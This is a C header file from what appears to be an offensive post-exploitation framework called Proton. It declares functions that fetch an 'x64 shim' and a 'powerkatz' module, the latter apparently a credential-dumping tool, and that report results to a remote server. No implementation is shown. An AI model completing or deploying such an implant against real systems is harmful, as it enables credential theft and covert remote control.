//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Winsock2.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet.lib")

#include "proton_types.h"

BOOL proton_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize);

BOOL proton_http_get_x64_shim(proton_shim_parsed *parsed, char **data, LPDWORD dwSize);
BOOL proton_http_get_powerkatz(proton_shim_parsed *parsed, char **data, LPDWORD dwSize);

BOOL proton_http_report_work(proton_shim_parsed *parsed, char *work);
BOOL proton_http_report_error(proton_shim_parsed *parsed, char *work);
